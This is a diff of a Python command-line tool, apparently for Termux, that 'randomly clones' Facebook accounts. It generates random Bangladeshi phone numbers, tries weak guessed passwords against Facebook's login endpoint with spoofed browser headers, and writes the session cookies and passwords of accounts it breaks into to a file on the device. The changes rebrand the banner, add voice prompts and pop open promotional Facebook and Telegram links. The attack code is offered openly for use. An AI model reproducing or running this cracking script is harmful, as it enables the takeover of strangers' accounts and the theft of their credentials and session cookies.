@@ -1,4 +1,3 @@
-#--------------------------(IMPORT BOX)--------------------------#
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
@@ -121,23 +120,21 @@ for txxxtt in range (1000):
 	ffg=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
 	ugen.append(ffg)
 #--------------------------(LOGO BOX)--------------------------#
-logo = ("""\033[38;5;46m                               
-\x1b[1;92m :'######::'##::::'##:'####:'########::'##::::'##:
-\x1b[1;92m'##... ##: ##:::: ##:. ##:: ##.... ##: ##:::: ##:
-\x1b[1;92m ##:::..:: ##:::: ##:: ##:: ##:::: ##: ##:::: ##:
-\x1b[1;92m. ######:: #########:: ##:: ########:: ##:::: ##:
-\x1b[1;92m:..... ##: ##.... ##:: ##:: ##.....::: ##:::: ##:
-\x1b[1;92m'##::: ##: ##:::: ##:: ##:: ##:::::::: ##:::: ##:
-\x1b[1;92m. ######:: ##:::: ##:'####: ##::::::::. #######::
-\x1b[1;92m:......:::..:::::..::....::..::::::::::.......:::                                                 
-\x1b[1;92m┏─────────────────────────────────────────┓
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m AUTHOR     \x1b[1;97m: \x1b[1;92mF U C K     
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m FACEBOOK   \x1b[1;97m: \x1b[1;92mSHIPU KHAN
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m WHATSAPP   \x1b[1;97m: \x1b[1;92m+8801797970064               
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m STATUS     \x1b[1;97m: \x1b[1;92mRANDOM CLONING 
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m TYPE       \x1b[1;97m: \x1b[1;92mFREE    
-\x1b[1;92m│\x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;92m GITHUB     \x1b[1;97m: \x1b[1;92mSHIPU-999-CYBER         
-\x1b[1;92m┗─────────────────────────────────────────┛  """)
+os.system("espeak \"well come,to Shipu Khan Random Cloning Start Please Wait\"")
+logo = ("""
+
+     _____ _   _____      ________________  ______
+ __ / / _ | | / / _ |____/ __/ ___/  _/ _ \/_  __/
+/ // / __ | |/ / __ /___/\ \/ /___/ // ___/ / /   
+\___/_/ |_|___/_/ |_|  /___/\___/___/_/    /_/    
+                                                  
+
+\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                              
+\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM OWNER     : SK-TERMUX-COMMMAND 
+\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL MAKE BY   : MD - SHIPU - KHAN 
+\033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION     : \033[1;35m3.0                
+\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬                              
+""")
 #--------------------------(MENU BOX)--------------------------#
 class Main:
     def __init__(self):
@@ -147,10 +144,10 @@ class Main:
         self.loop = 0
         os.system("clear")
         print(logo)
-    #    os.system('xdg-open www.xxx.com')
+        os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
         print('\033[1;31m[\033[1;32m1\033[1;31m]  \x1b[38;5;46m START RANDOM CLONE')
         print('\033[1;31m[\033[1;32m2\033[1;31m]  \x1b[38;5;46m EXIT')
-        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
+        print(f"\033[1;31m===================")
         Shorif =input("\033[1;32m[\033[1;32m?\033[1;32m] CHOOSE : ")
         if Shorif in ["1", "01"]:
             v2()
@@ -175,7 +172,9 @@ def v2():
     os.system('clear')
     print(logo)
     print('[+] BD NUMBER  => 016 017 018 019')
+    os.system('xdg-open https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
     kode = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
+    os.system('xdg-open https://t.me/JAVA_SCIPT_KING')
     kodex = ''.join(random.choice(string.digits) for _ in range(2))
     kod = ''.join(random.choice(string.digits) for _ in range(2))
     print('[+] 2000. 5000. 10000. 15000. 50000')
@@ -187,6 +186,7 @@ def v2():
         os.system('clear')
         print(logo)
         tl = str(len(user))
+        print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
         print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m SIM CODE : '+kode)
         print('\033[1;31m[\033[1;32m=\033[1;31m]\x1b[38;5;46m CRACK ID : '+tl)
         print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
@@ -194,13 +194,12 @@ def v2():
             uid = kode+kodex+kod+guru
             pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'304050','607080']
             akash.submit(rcrack1,uid,pwx,tl)
-    print(linex)
+    print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
-    print(linex)
+    print('\x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆')
 #--------------------------(MATHOD BOX)--------------------------#
 def rcrack1(uid,pwx,tl):
     global loop
-    global cps
     global oks
     global proxy
     try:
@@ -208,9 +207,9 @@ def rcrack1(uid,pwx,tl):
             pro = random.choice(ugen)
             session = requests.Session()
             bi = random.choice([A,B,C,D,E,F,G,H])
-            sys.stdout.write(f'\r \033[1;31m[%sARAFAT\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;31m[%sTANJID-XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45m[\033[38;5;42mOK-]\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://m.facebook.com').text
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -221,40 +220,35 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'm.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'dpr': '2.75',
-            'referer': 'https://www.google.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"22111317PI"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent':pro}
-            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            header_freefb = {"authority": 'x.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print('\r\r\033[1;32m[SK-CYBER-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
-                open('/sdcard/SK-CYBER.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
+                print('\r\r\033[1;32m[SF-SHIPU💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🍪]\x1b[38;5;254mCOOKIE = \x1b[38;5;254m'+coki+ ' ''  \x1b[38;5;254m')
+                os.system("espeak \"SHIPU,OK, ID \"")
+                open('/sdcard/SF-SHIPU-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
                 oks.append(uid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-#              print(f"\x1b[38;5;196m[SK-CYBER💔] {uid}|{ps}")
-                open('/sdcard/SK-CYBER-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(uid)
                 break
             else:
                 continue
